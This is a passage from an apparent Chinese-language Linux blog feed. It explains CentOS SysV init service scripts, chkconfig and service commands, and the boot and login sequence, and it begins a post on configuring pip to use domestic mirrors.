0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">udev-post          0:关闭    1:启用    2:启用    3:启用    4:启用    5:启用    6:关闭</div></pre></td></tr></table></figure></p>
<h4 id="2-默认服务说明"><a href="#2-默认服务说明" class="headerlink" title="2. 默认服务说明"></a>2. 默认服务说明</h4><p>1.auditd</p>
<blockquote>
<p>Linux审计工具,其负责将审计记录写入磁盘。</p>
</blockquote>
<p>2.crond</p>
<blockquote>
<p>计划任务服务,用于周期性执行一条或多条指令</p>
</blockquote>
<p>4.ip6tables()</p>
<blockquote>
<p>ipv6的防火墙</p>
</blockquote>
<p>5.iptables</p>
<blockquote>
<p>ipv4的防火墙软件</p>
</blockquote>
<p>6.messagebus</p>
<blockquote>
<p>负责在各个系统进程之间传递消息</p>
</blockquote>
<p>7.netconsole</p>
<blockquote>
<p>初始化网络控制台登陆</p>
</blockquote>
<p>8.netfs</p>
<blockquote>
<p>用于在系统启动时自动挂载网络中的共享文件系统，如NFS，Samba等。</p>
</blockquote>
<p>9.network    </p>
<blockquote>
<p>在系统启动时激活所有网络接口</p>
</blockquote>
<p>10.postfix</p>
<blockquote>
<p>邮件服务器系统,如服务器不提供邮件服务，可关闭</p>
</blockquote>
<p>11.rdisc</p>
<blockquote>
<p>该服务通过预先加载特定的应用程序到内存中以提供性能。如果你想程序启动更快，就开启它。</p>
</blockquote>
<p>12.restorecond</p>
<blockquote>
<p>用于给 SELinux 监测和重新加载正确的文件上下文（file contexts）。它不是必须的，但如果你使用 SELinux 的话强烈建议开启它。</p>
</blockquote>
<p>13.rsysloge</p>
<p>14.saslauthd    </p>
<blockquote>
<p>sasl认证服务相关,不用时可关闭    </p>
</blockquote>
<p>15.sshd(远程登录)</p>
<blockquote>
<p>ssh服务端，可提供安全的shell连接，用于远程登录</p>
</blockquote>
<p>16.udev-post(设备管理)</p>
<blockquote>
<p>设备管理系统，默认情况下”udev”支持很多个规则，用于设备的权限和行为管理，该服务允许用于保存用户应用的</p>
</blockquote>
<p>另外还有5个特殊的文件 halt, functions, killall, sandbox ,single 。这些文件的作用时提供init.d目录下的文件使用的统一脚本</p>
<h2 id="四、服务脚本内容说明"><a href="#四、服务脚本内容说明" class="headerlink" title="四、服务脚本内容说明"></a>四、服务脚本内容说明</h2><p>我们拿一个服务脚本的片段来重点讲一下服务脚本必备的一下东西<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div></pre></td><td class="code"><pre><div class="line">[root@centos init.d]<span class="comment"># cat sshd</span></div><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># sshd		Start up the OpenSSH server daemon</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># chkconfig: 2345 55 25</span></div><div class="line"><span class="comment"># description: SSH is a protocol for secure remote shell access. \</span></div><div class="line"><span class="comment">#              This service starts up the OpenSSH server daemon.</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">### BEGIN INIT INFO</span></div><div class="line"><span class="comment"># Provides: sshd</span></div><div class="line"><span class="comment"># Required-Start: $local_fs $network $syslog</span></div><div class="line"><span class="comment"># Required-Stop: $local_fs $syslog</span></div><div class="line"><span class="comment"># Should-Start: $syslog</span></div><div class="line"><span class="comment"># Should-Stop: $network $syslog</span></div><div class="line"><span class="comment"># Default-Start: 2 3 4 5</span></div><div class="line"><span class="comment"># Default-Stop: 0 1 6</span></div><div class="line"><span class="comment"># Short-Description: Start up the OpenSSH server daemon</span></div><div class="line"><span class="comment"># Description:       SSH is a protocol for secure remote shell access.</span></div><div class="line"><span class="comment">#		     This service starts up the OpenSSH server daemon.</span></div><div class="line"><span class="comment">### END INIT INFO</span></div><div class="line"></div><div class="line"><span class="comment"># source function library</span></div><div class="line">. /etc/rc.d/init.d/<span class="built_in">functions</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">RETVAL=0</div><div class="line">prog=<span class="string">"sshd"</span></div><div class="line">lockfile=/var/lock/subsys/<span class="variable">$prog</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">PID_FILE=/var/run/sshd.pid</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">start()</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">    </div><div class="line">	RETVAL=$?</div><div class="line">	[ <span class="variable">$RETVAL</span> -eq 0 ] &amp;&amp; touch <span class="variable">$lockfile</span></div><div class="line">	<span class="built_in">echo</span></div><div class="line">	<span class="built_in">return</span> <span class="variable">$RETVAL</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">stop()</div><div class="line">&#123;</div><div class="line">	<span class="built_in">echo</span> -n $<span class="string">"Stopping <span class="variable">$prog</span>: "</span></div><div class="line">	killproc -p <span class="variable">$PID_FILE</span> <span class="variable">$SSHD</span></div><div class="line">	RETVAL=$?</div><div class="line">	</div><div class="line">    ...</div><div class="line"></div><div class="line">	[ <span class="variable">$RETVAL</span> -eq 0 ] &amp;&amp; rm -f <span class="variable">$lockfile</span></div><div class="line">	<span class="built_in">echo</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">reload()</div><div class="line">&#123;</div><div class="line">	<span class="built_in">echo</span> -n $<span class="string">"Reloading <span class="variable">$prog</span>: "</span></div><div class="line">	killproc -p <span class="variable">$PID_FILE</span> <span class="variable">$SSHD</span> -HUP</div><div class="line">	RETVAL=$?</div><div class="line">	<span class="built_in">echo</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">restart</span></span>() &#123;</div><div class="line">	stop</div><div class="line">	start</div><div class="line">&#125;</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">	start)</div><div class="line">		rh_status_q &amp;&amp; <span class="built_in">exit</span> 0</div><div class="line">		start</div><div class="line">		;;</div><div class="line">	stop)</div><div class="line">		<span class="keyword">if</span> ! rh_status_q; <span class="keyword">then</span></div><div class="line">			rm -f <span class="variable">$lockfile</span></div><div class="line">			<span class="built_in">exit</span> 0</div><div class="line">		<span class="keyword">fi</span></div><div class="line">		stop</div><div class="line">		;;</div><div class="line">	restart)</div><div class="line">		restart</div><div class="line">		;;</div><div class="line">	reload)</div><div class="line">		rh_status_q || <span class="built_in">exit</span> 7</div><div class="line">		reload</div><div class="line">		;;</div><div class="line">	force-reload)</div><div class="line">		force_reload</div><div class="line">		;;</div><div class="line">	condrestart|try-restart)</div><div class="line">		rh_status_q || <span class="built_in">exit</span> 0</div><div class="line">		<span class="keyword">if</span> [ -f <span class="variable">$lockfile</span> ] ; <span class="keyword">then</span></div><div class="line">			do_restart_sanity_check</div><div class="line">			<span class="keyword">if</span> [ <span class="variable">$RETVAL</span> -eq 0 ] ; <span class="keyword">then</span></div><div class="line">				stop</div><div class="line">				<span class="comment"># avoid race</span></div><div class="line">				sleep 3</div><div class="line">				start</div><div class="line">			<span class="keyword">else</span></div><div class="line">				RETVAL=6</div><div class="line">			<span class="keyword">fi</span></div><div class="line">		<span class="keyword">fi</span></div><div class="line">		;;</div><div class="line">	status)</div><div class="line">		rh_status</div><div class="line">		RETVAL=$?</div><div class="line">		<span class="keyword">if</span> [ <span class="variable">$RETVAL</span> -eq 3 -a -f <span class="variable">$lockfile</span> ] ; <span class="keyword">then</span></div><div class="line">			RETVAL=2</div><div class="line">		<span class="keyword">fi</span></div><div class="line">		;;</div><div class="line">	*)</div><div class="line">		<span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|restart|reload|force-reload|condrestart|try-restart|status&#125;"</span></div><div class="line">		RETVAL=2</div><div class="line"><span class="keyword">esac</span></div><div class="line"><span class="built_in">exit</span> <span class="variable">$RETVAL</span></div></pre></td></tr></table></figure></p>
<h3 id="1-var-lock-subsys-目录的作用"><a href="#1-var-lock-subsys-目录的作用" class="headerlink" title="1. /var/lock/subsys/ 目录的作用"></a>1. /var/lock/subsys/ 目录的作用</h3><p>通常使用这个目录下的文件存在性做为服务启／停的状态标志。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">prog=<span class="string">"sshd"</span></div><div class="line">lockfile=/var/lock/subsys/<span class="variable">$prog</span></div></pre></td></tr></table></figure></p>
<h3 id="2-var-run-目录的作用"><a href="#2-var-run-目录的作用" class="headerlink" title="2. /var/run/ 目录的作用"></a>2. /var/run/ 目录的作用</h3><p>通常用于存储服务进程的PID，在服务脚本收到关闭、重启指令时向进程PID发送信号<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PID_FILE=/var/run/sshd.pid</div></pre></td></tr></table></figure></p>
<h3 id="3-服务脚本函数存在的必要性"><a href="#3-服务脚本函数存在的必要性" class="headerlink" title="3. 服务脚本函数存在的必要性"></a>3. 服务脚本函数存在的必要性</h3><p>sshd 有很多内部函数，但是服务最基本的函数start和stop是应该有的。</p>
<h3 id="4-服务脚本注释的重要性"><a href="#4-服务脚本注释的重要性" class="headerlink" title="4. 服务脚本注释的重要性"></a>4. 服务脚本注释的重要性</h3><p>服务脚本有几处注释是非常重要的，如果没有这样的注释他就不是一个服务脚本， chkconfig指令没有办法管理<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># chkconfig: 2345 55 25</span></div><div class="line"><span class="comment"># Default-Start: 2 3 4 5</span></div><div class="line"><span class="comment"># Default-Stop: 0 1 6</span></div></pre></td></tr></table></figure></p>
<p>如果没有这3句中的其中一句注释，chkconfig 不认为这个脚本是服务，无法进行add, del等操作，我们来说明一下：</p>
<ul>
<li># chkconfig: 2345 55 25 分别代表 2345 运行级别默认启动, 启动顺序优先级为55, 关机停止顺序优先级为25</li>
<li>默认情况下服务的所有运行基本都是不启动服务的</li>
<li>Default-Stop 的默认停止服务级别是最高的</li>
<li>chkconfig: 2345 与 Default-Start: 2 3 4 5 是与的关系，哪个配置来都认为是默认启动的</li>
</ul>
<h3 id="五、管理服务的命令"><a href="#五、管理服务的命令" class="headerlink" title="五、管理服务的命令"></a>五、管理服务的命令</h3><h4 id="1-chkconfig"><a href="#1-chkconfig" class="headerlink" title="1. chkconfig"></a>1. chkconfig</h4><blockquote>
<p>chkconfig 实际上是管理/etc/rcX.d/目录软链接文件与/etc/rc.d/init.d/目录下文件的对应关系</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@centos]# chkconfig --add sshd</div></pre></td></tr></table></figure>
<p>这条chkconfig指令做了以下几件事</p>
<ol>
<li>查看/etc/rc.d/init.d/sshd脚本的 chkconfig、Default_start、Default_stop注释字段, 确认是否为服务脚本</li>
<li>创建rcX.d文件链接,查看一下文件目录可得知<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[root@centos etc]# find /etc/ -name &apos;*sshd&apos;</div><div class="line">/etc/rc.d/rc0.d/K25sshd</div><div class="line">/etc/rc.d/rc1.d/K25sshd</div><div class="line">/etc/rc.d/rc2.d/S55sshd</div><div class="line">/etc/rc.d/rc3.d/S55sshd</div><div class="line">/etc/rc.d/rc4.d/S55sshd</div><div class="line">/etc/rc.d/rc5.d/S55sshd</div><div class="line">/etc/rc.d/rc6.d/K25sshd</div><div class="line">/etc/rc.d/init.d/sshd</div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="2-service"><a href="#2-service" class="headerlink" title="2. service"></a>2. service</h4><blockquote>
<p>service 命令接受 服务名称执行动作两个参数，调用 /etc/rc.d/init.d/下的服务脚步执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@centos etc]# service sshd restart</div><div class="line">Stopping sshd:                                             [  OK  ]</div><div class="line">Starting sshd:                                             [  OK  ]</div></pre></td></tr></table></figure>
<p>这条service 指令实际上调用了 /etc/rc.d/init.d/sshd restart </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、服务脚本的文件路径&quot;&gt;&lt;a href=&quot;#一、服务脚本的文件路径&quot; class=&quot;headerlink&quot; title=&quot;一、服务脚本的文件路径&quot;&gt;&lt;/a&gt;一、服务脚本的文件路径&lt;/h2&gt;&lt;p&gt;Linux(RH系列) 服务脚本默认都存放在 /etc/rc.d/i
    
    </summary>
    
      <category term="Linux" scheme="http://www.0x001.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.0x001.com/tags/Linux/"/>
    
      <category term="服务脚本" scheme="http://www.0x001.com/tags/%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>Linux启动顺序</title>
    <link href="http://www.0x001.com/2017/02/06/Linux%E5%90%AF%E5%8A%A8%E9%A1%BA%E5%BA%8F/"/>
    <id>http://www.0x001.com/2017/02/06/Linux启动顺序/</id>
    <published>2017-02-06T02:05:32.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、系统启动初始化init阶段"><a href="#一、系统启动初始化init阶段" class="headerlink" title="一、系统启动初始化init阶段"></a>一、系统启动初始化init阶段</h1><h2 id="1-Grub加载内核之后，第一个运行的程序是-sbin-init"><a href="#1-Grub加载内核之后，第一个运行的程序是-sbin-init" class="headerlink" title="1. Grub加载内核之后，第一个运行的程序是 /sbin/init"></a>1. Grub加载内核之后，第一个运行的程序是 /sbin/init</h2><p>init是SysVinit的一个实体进程，是系统所有进程的顶级父进程，PID是1</p>
<h2 id="2-sbin-init-读取-etc-inittab文件，确定运行级别"><a href="#2-sbin-init-读取-etc-inittab文件，确定运行级别" class="headerlink" title="2.  /sbin/init 读取 /etc/inittab文件，确定运行级别"></a>2.  /sbin/init 读取 /etc/inittab文件，确定运行级别</h2><p><strong>etc/inittab文件的信息会包含以下信息给init程序</strong></p>
<ul>
<li>捕获组合键的定义</li>
<li>定义电源 fail/restore 脚本</li>
<li>启动 getty 和虚拟控制台</li>
<li>系统需要进入的 runlevel<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">[root@centos ~]# cat /etc/inittab</div><div class="line"># inittab is only used by upstart for the default runlevel.</div><div class="line">#</div><div class="line"># ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM.</div><div class="line">#</div><div class="line"># System initialization is started by /etc/init/rcS.conf</div><div class="line">#</div><div class="line"># Individual runlevels are started by /etc/init/rc.conf</div><div class="line">#</div><div class="line"># Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf</div><div class="line">#</div><div class="line"># Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf,</div><div class="line"># with configuration in /etc/sysconfig/init.</div><div class="line">#</div><div class="line"># For information on how to write upstart event handlers, or how</div><div class="line"># upstart works, see init(5), init(8), and initctl(8).</div><div class="line">#</div><div class="line"># Default runlevel. The runlevels used are:</div><div class="line">#   0 - halt (Do NOT set initdefault to this)</div><div class="line">#   1 - Single user mode</div><div class="line">#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)</div><div class="line">#   3 - Full multiuser mode</div><div class="line">#   4 - unused</div><div class="line">#   5 - X11</div><div class="line">#   6 - reboot (Do NOT set initdefault to this)</div><div class="line">#</div><div class="line">id:3:initdefault:</div></pre></td></tr></table></figure>
</li>
</ul>
<p>当前系统使用有网络支持的多用户模式，字符终端，没有图形界面</p>
<p><strong>Linux的运行等级设定如下:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0：关机</div><div class="line">1：单用户模式</div><div class="line">2：无网络支持的多用户模式</div><div class="line">3：有网络支持的多用户模式</div><div class="line">4：保留，未使用</div><div class="line">5：有网络支持有X-Window支持的多用户模式</div><div class="line">6：重新引导系统，即重启</div></pre></td></tr></table></figure></p>
<h2 id="3-sbin-init-执行-etc-rc-d-rc-sysinit脚本"><a href="#3-sbin-init-执行-etc-rc-d-rc-sysinit脚本" class="headerlink" title="3. /sbin/init 执行 /etc/rc.d/rc.sysinit脚本"></a>3. /sbin/init 执行 /etc/rc.d/rc.sysinit脚本</h2><p><strong>sysinit的是系统启动的初始化脚本, 会做以下一些工作：</strong></p>
<ul>
<li>激活 udev 和 selinux</li>
<li>设置定义在/etc/sysctl.conf 中的内核参数</li>
<li>设置系统时钟</li>
<li>加载 keymaps</li>
<li>使用交换分区</li>
<li>设置主机名(hostname)</li>
<li>根分区检查和 remount</li>
<li>激活 RAID 和 LVM 设备</li>
<li>开启磁盘配额</li>
<li>检查并挂载所有文件系统</li>
<li>清除过期的 locks 和 PID 文件</li>
</ul>
<h2 id="4-sbin-init-执行-etc-rc-d-rc脚本"><a href="#4-sbin-init-执行-etc-rc-d-rc脚本" class="headerlink" title="4. /sbin/init 执行 /etc/rc.d/rc脚本"></a>4. /sbin/init 执行 /etc/rc.d/rc脚本</h2><blockquote>
<p>/etc/rc脚本确定 /etc/inittab文件配置的运行级别ID(X)。</p>
</blockquote>
<p>每个 runlevel X 都有一个这样的目录，目录名为/etc/rc.d/rcX.d。在这些目录下存放着很多不同的脚本。</p>
<p>文件名以 S (start) 开头的脚本就是启动时应该运行的脚本，S 后面跟的数字定义了这些脚本的执行顺序。</p>
<p>文件名以 K (kill) 开头的脚本表示启动的时候不执行的脚本。</p>
<p>在/etc/rc.d/rcX.d 目录下的脚本其实都是一些软链接文件，真实的脚本文件存放在/etc/init.d 目录下, 这个目录的文件通常被称为Linux服务启动脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">[root@centos rc3.d]# pwd</div><div class="line">/etc/rc3.d</div><div class="line">[root@centos rc3.d]# ls -al</div><div class="line">总用量 8</div><div class="line">drwxr-xr-x.  2 root root 4096 11月 29 13:12 .</div><div class="line">drwxr-xr-x. 10 root root 4096 1月  27 09:34 ..</div><div class="line">lrwxrwxrwx.  1 root root   19 11月 29 12:49 K10saslauthd -&gt; ../init.d/saslauthd</div><div class="line">lrwxrwxrwx.  1 root root   17 11月 16 2015 K30postfix -&gt; ../init.d/postfix</div><div class="line">lrwxrwxrwx.  1 root root   20 11月 16 2015 K50netconsole -&gt; ../init.d/netconsole</div><div class="line">lrwxrwxrwx.  1 root root   21 11月 16 2015 K87restorecond -&gt; ../init.d/restorecond</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 16 2015 K89rdisc -&gt; ../init.d/rdisc</div><div class="line">lrwxrwxrwx.  1 root root   19 11月 16 2015 K92ip6tables -&gt; ../init.d/ip6tables</div><div class="line">lrwxrwxrwx.  1 root root   18 11月 29 12:34 K92iptables -&gt; ../init.d/iptables</div><div class="line">lrwxrwxrwx.  1 root root   22 11月 16 2015 S02lvm2-monitor -&gt; ../init.d/lvm2-monitor</div><div class="line">lrwxrwxrwx.  1 root root   17 11月 16 2015 S10network -&gt; ../init.d/network</div><div class="line">lrwxrwxrwx.  1 root root   16 11月 16 2015 S11auditd -&gt; ../init.d/auditd</div><div class="line">lrwxrwxrwx.  1 root root   17 11月 16 2015 S12rsyslog -&gt; ../init.d/rsyslog</div><div class="line">lrwxrwxrwx.  1 root root   26 11月 16 2015 S25blk-availability -&gt; ../init.d/blk-availability</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 16 2015 S25netfs -&gt; ../init.d/netfs</div><div class="line">lrwxrwxrwx.  1 root root   19 11月 16 2015 S26udev-post -&gt; ../init.d/udev-post</div><div class="line">lrwxrwxrwx.  1 root root   14 11月 26 08:19 S55sshd -&gt; ../init.d/sshd</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 16 2015 S90crond -&gt; ../init.d/crond</div><div class="line">lrwxrwxrwx.  1 root root   15 11月 29 13:12 S95jexec -&gt; ../init.d/jexec</div><div class="line">lrwxrwxrwx.  1 root root   11 11月 16 2015 S99local -&gt; ../rc.local</div></pre></td></tr></table></figure></p>
<blockquote>
<p>chkconfig 名字就是对/etc/init.d/目录下的服务脚本进行管理的工具，实际上就是对 /etc/rcX.d/下的软链接文件的增删改。</p>
</blockquote>
<h2 id="5-sbin-init-执行-etc-rc-d-rc-local-脚本"><a href="#5-sbin-init-执行-etc-rc-d-rc-local-脚本" class="headerlink" title="5. /sbin/init 执行 /etc/rc.d/rc.local 脚本"></a>5. /sbin/init 执行 /etc/rc.d/rc.local 脚本</h2><p>rc.local 是 Linux 留给用户进行个性化设置的地方。比如放一些自定义的启动命令</p>
<h2 id="6-启动登录终端-sbin-mingetty，等待登录"><a href="#6-启动登录终端-sbin-mingetty，等待登录" class="headerlink" title="6. 启动登录终端/sbin/mingetty，等待登录"></a>6. 启动登录终端/sbin/mingetty，等待登录</h2><p>mingetty 会启动 /bin/login进程，用来验证帐户密码，输入正确的账户密码之后,从/etc/passwd的账户配置里面启动响应的shell,例如下面root帐户使用了bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[root@centos ~]# cat /etc/passwd</div><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</div><div class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</div><div class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</div><div class="line">sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</div><div class="line">halt:x:7:0:halt:/sbin:/sbin/halt</div><div class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</div></pre></td></tr></table></figure></p>
<h1 id="二、用户登录阶段"><a href="#二、用户登录阶段" class="headerlink" title="二、用户登录阶段"></a>二、用户登录阶段</h1><h2 id="7-用户登录后先执行-etc-profile"><a href="#7-用户登录后先执行-etc-profile" class="headerlink" title="7. 用户登录后先执行 /etc/profile"></a>7. 用户登录后先执行 /etc/profile</h2><blockquote>
<p>这个文件是所有用户登录系统后的设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置</p>
</blockquote>
<p>紧接着profile文件里面去启动 /etc/profile.d 下的所有文件</p>
<h2 id="8-执行-bash-profile"><a href="#8-执行-bash-profile" class="headerlink" title="8. 执行 ~/.bash_profile"></a>8. 执行 ~/.bash_profile</h2><blockquote>
<p>这个文件是用户专属的bash shell初始化脚本<br>当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量<br>~/.bash_profile会判断 ~/.bashrc文件是否存在并执行，~/.bashrc会判断/etc/bashrc文件是否存在并执行，最后设置PATH环境变量，结束。<br>所以~/.bashrc和/etc/bashrc都是层层嵌套执行的。</p>
</blockquote>
<h2 id="9-执行-bashrc"><a href="#9-执行-bashrc" class="headerlink" title="9. 执行 ~/.bashrc"></a>9. 执行 ~/.bashrc</h2><blockquote>
<p>这个文件是用户专属的bash shell初始化脚本</p>
</blockquote>
<p>当登录时以及每次打开新的shell时,该文件被执行<br>~/.bashrc 会判断 /etc/bashrc文件是否存在并执行</p>
<h2 id="10-执行-etc-bashrc"><a href="#10-执行-etc-bashrc" class="headerlink" title="10. 执行 /etc/bashrc"></a>10. 执行 /etc/bashrc</h2><blockquote>
<p>这个文件是bash环境的全局文件。几乎默认存在，每个登录的用户上去之后都要初始化一下bash的环境。</p>
</blockquote>
<p>当bash shell被打开时,该文件被执行（即每次新开一个终端，都会执行bashrc）</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、系统启动初始化init阶段&quot;&gt;&lt;a href=&quot;#一、系统启动初始化init阶段&quot; class=&quot;headerlink&quot; title=&quot;一、系统启动初始化init阶段&quot;&gt;&lt;/a&gt;一、系统启动初始化init阶段&lt;/h1&gt;&lt;h2 id=&quot;1-Grub加载内核之后，
    
    </summary>
    
      <category term="Linux" scheme="http://www.0x001.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.0x001.com/tags/Linux/"/>
    
      <category term="启动顺序" scheme="http://www.0x001.com/tags/%E5%90%AF%E5%8A%A8%E9%A1%BA%E5%BA%8F/"/>
    
      <category term="init" scheme="http://www.0x001.com/tags/init/"/>
    
  </entry>
  
  <entry>
    <title>Python设置国内镜像</title>
    <link href="http://www.0x001.com/2017/02/01/python%E8%AE%BE%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F/"/>
    <id>http://www.0x001.com/2017/02/01/python设置国内镜像/</id>
    <published>2017-01-31T16:13:45.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><blockquote>
<p>每次使用pip安装总是很慢，有时候卡很久不动，为了解决这个问题，所以得配置到国内的镜像，这样走国内电信比较快</p>
</blockquote>
<h2 id="Linux下设置国内镜像"><a href="#Linux下设置国内镜像" class="headerlink" title="Linux下设置国内镜像"></a>Linux下设置国内镜像</h2><p>阿里的源地址：<a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="external">http://mirrors.aliyun.com/pypi/simple/</a><br>豆瓣的源地址：<a href="http://pypi.douban.com/simple" target="_blank" rel="external">http://pypi.douban.com/simple</a></p>
<h3 id="easy-install-配置"><a href="#easy-install-配置" class="headerlink" title="easy_install 配置"></a>easy_install 配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@centos ~]<span class="comment"># cat ~/.pydistutils.cfg</span></div><div class="line">[easy_install]</div><div class="line">index-url=http://pypi.douban.com/simple</div></pre></td></tr></table></figure>
